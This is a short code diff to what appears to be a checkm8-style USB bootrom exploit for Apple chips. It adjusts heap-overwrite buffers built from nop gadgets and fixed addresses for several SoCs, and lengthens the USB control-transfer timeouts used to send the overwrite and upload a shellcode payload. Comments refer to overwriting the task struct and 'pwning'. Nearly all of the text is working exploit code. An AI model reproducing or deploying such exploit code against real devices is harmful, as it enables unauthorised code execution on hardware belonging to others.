@@ -491,7 +491,7 @@ def all_exploit_configs():
     s5l895xx_overwrite = b'\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
     t800x_overwrite = b'\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
     s5l8960x_overwrite = b'\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-    t8010_overwrite = b'\0' * 0x580 + struct.pack('<32x2Q', t8010_nop_gadget, 0x1800B0800)
+    t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
     t8011_overwrite = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI', t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget,
                                                   0x1800B0800, 0xbeefbeef)
     t8015_overwrite = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget,
@@ -585,7 +585,7 @@ def exploit():
     # t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q',             t8010_nop_gadget, 0x1800B0800)
     # SP = 0x1800B0800?
     # This overwrites the task struct
-    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 10)
+    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
 
     # return struct.pack('<1024sQ504x2Q496s32x',
     #  0x400 = t8010_shellcode,
@@ -595,7 +595,7 @@ def exploit():
     # upload the payload, or actually, this is after the pwning happens and this is exec
     # this is usb_0xA1_2_arm64 and checkm8_arm64
     for i in range(0, len(payload), 0x800):
-        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i + 0x800], 10)
+        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i + 0x800], 50)
 
     # this is trigger?
     dfu.usb_reset(device)
